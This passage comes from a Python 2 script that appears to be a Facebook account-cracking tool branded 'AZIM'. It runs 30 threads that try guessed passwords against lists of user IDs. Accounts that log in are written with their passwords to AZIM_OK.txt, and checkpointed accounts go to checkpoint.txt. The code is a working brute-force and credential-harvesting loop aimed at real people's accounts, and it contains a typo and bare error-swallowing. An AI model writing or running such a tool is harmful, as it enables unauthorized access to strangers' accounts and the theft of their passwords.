                        print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    azim()
    print ''
    print '\x1b[1;92mTHE PROCESS HAS COMPLETED'
    print '\x1b[1;93m Total \x1b[1;92mOk\x1b[0m/\x1b[1;93mCp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    azim()
    print ''
    raw_input('\x1b[1;93m PRESS ENTER TO BACK')
    choice()

      
if __name__ == '__main__':
    key_check()



